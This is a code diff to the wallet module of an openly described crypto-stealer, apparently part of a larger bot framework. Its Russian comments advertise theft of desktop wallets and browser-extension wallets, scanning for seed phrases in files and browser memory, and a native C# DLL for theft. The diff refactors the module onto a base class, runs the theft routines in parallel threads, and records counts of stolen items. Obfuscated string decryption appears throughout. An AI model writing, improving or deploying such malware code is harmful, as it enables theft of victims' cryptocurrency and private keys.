@@ -14,6 +14,9 @@ from typing import List, Dict, Any, Optional, Set, Tuple
 from pathlib import Path
 from datetime import datetime
 import urllib.request
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+from core.base import BaseModule
 
 try:
     from core.obfuscation import decrypt_string
@@ -38,8 +41,8 @@ class WalletBridge:
     def get_manager(cls):
         if cls._manager is None and CLR_AVAILABLE:
             try:
-                project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-                dll_path = os.path.join(project_root, "defense", decrypt_string("GVMUByslKkw+GwY="))
+                # Using relative path from core/
+                dll_path = os.path.join(os.path.dirname(__file__), "wallets.dll")
                 if os.path.exists(dll_path):
                     clr.AddReference(dll_path)
                     from StealthModule import WalletManager
@@ -49,18 +52,14 @@ class WalletBridge:
         return cls._manager
 
 
-class WalletModule:
+class WalletModule(BaseModule):
     """
-    Абсолютно неуязвимый крипто-стиллер
-    - Кража десктопных кошельков (20+)
-    - Кража браузерных расширений (15+)
-    - Поиск seed-фраз в файлах и памяти
-    - Расшифровка MetaMask и других vaults
-    - Интеграция с нативным C# кодом
+    Абсолютно неуязвимый крипто-стиллер (A-04)
     """
     
-    def __init__(self, output_dir: str):
-        self.output_dir = Path(output_dir).absolute() / decrypt_string("LUABGzo+")
+    def __init__(self, bot=None, report_manager=None, temp_dir=None):
+        super().__init__(bot, report_manager, temp_dir)
+        self.output_dir = Path(self.temp_dir).absolute() / "Wallets"
         self.output_dir.mkdir(parents=True, exist_ok=True)
         
         # Основные пути
@@ -77,7 +76,12 @@ class WalletModule:
         # Инциализация для линтера
         self.wallets: Dict[str, Path] = {}
         self.extensions: Dict[str, str] = {}
+        self.enc_strings: Dict[str, str] = {}
         self._seed_exts: Set[str] = set()
+        self._seed_pattern: Optional[Any] = None
+        self._private_key_pattern: Optional[Any] = None
+        self._vault_pattern: Optional[Any] = None
+        self._seed_keywords: Set[str] = set()
         
         # Загружаем BIP39 слова
         self.bip39_words = self._load_bip39_words()
@@ -219,13 +223,11 @@ class WalletModule:
         }
         return common_words
         
-    def run(self) -> Dict[str, Any]:
+    def run(self) -> bool:
         """
-        Запускает все методы кражи
-        Returns:
-            Dict с результатами
+        A-04: Standardized run method.
         """
-        print("[WalletModule] Starting crypto theft...")
+        self.log("Starting crypto theft...")
         start_time = time.time()
         
         # 0. Нативная кража через C# (Primary)
@@ -238,37 +240,42 @@ class WalletModule:
                 if res:
                     native_found = res.split(';')
                 native_success = True
-                print(f"[WalletModule] Native theft successful: {len(native_found)} items")
+                self.log(f"Native theft successful: {len(native_found)} items")
             except Exception as e:
-                print(f"[WalletModule] Native theft failed: {e}")
+                self.log(f"Native theft failed: {e}")
         
-        # 1. Кража десктопных кошельков
-        wallets = self.steal_desktop_wallets()
-        print(f"[WalletModule] Desktop wallets stolen: {len(wallets)}")
-        
-        # 2. Кража браузерных расширений
-        extensions = self.steal_browser_extensions()
-        print(f"[WalletModule] Browser extensions stolen: {len(extensions)}")
-        
-        # 3. Поиск seed-фраз в файлах
-        seed_files = self.scan_seed_phrases_in_files()
-        print(f"[WalletModule] Seed files found: {len(seed_files)}")
-        
-        # 4. Поиск seed-фраз в памяти браузеров
-        seed_memory = self.scan_seed_phrases_in_memory()
-        print(f"[WalletModule] Memory seeds found: {len(seed_memory)}")
+        # Parallel execution of sub-modules
+        results = {}
+        with ThreadPoolExecutor(max_workers=4) as executor:
+            futures = {
+                executor.submit(self.steal_desktop_wallets): "wallets",
+                executor.submit(self.steal_browser_extensions): "extensions",
+                executor.submit(self.scan_seed_phrases_in_files): "seed_files",
+                executor.submit(self.scan_seed_phrases_in_memory): "seed_memory"
+            }
+            
+            for future in as_completed(futures):
+                name = futures[future]
+                try:
+                    results[name] = future.result()
+                except Exception as e:
+                    self.log(f"Error in {name}: {e}")
+                    results[name] = []
+
+        self.last_run_stats = {
+            "wallets": len(results.get("wallets", [])),
+            "extensions": len(results.get("extensions", [])),
+            "seeds": len(results.get("seed_files", [])) + len(results.get("seed_memory", [])),
+            "native_items": len(native_found)
+        }
         
         elapsed = time.time() - start_time
-        print(f"[WalletModule] Theft completed in {elapsed:.2f} seconds")
+        self.log(f"Theft completed in {elapsed:.2f} seconds")
         
-        return {
-            "wallets": wallets,
-            "extensions": extensions,
-            "seeds": seed_files + seed_memory,
-            "native_success": native_success,
-            "native_found": native_found,
-            "elapsed": elapsed
-        }
+        return True if (native_found or results.get("wallets") or results.get("extensions")) else False
+
+    def get_stats(self) -> Dict[str, int]:
+        return getattr(self, "last_run_stats", {"items": 0})
         
     def steal_desktop_wallets(self) -> List[str]:
         """Крадет десктопные кошельки"""
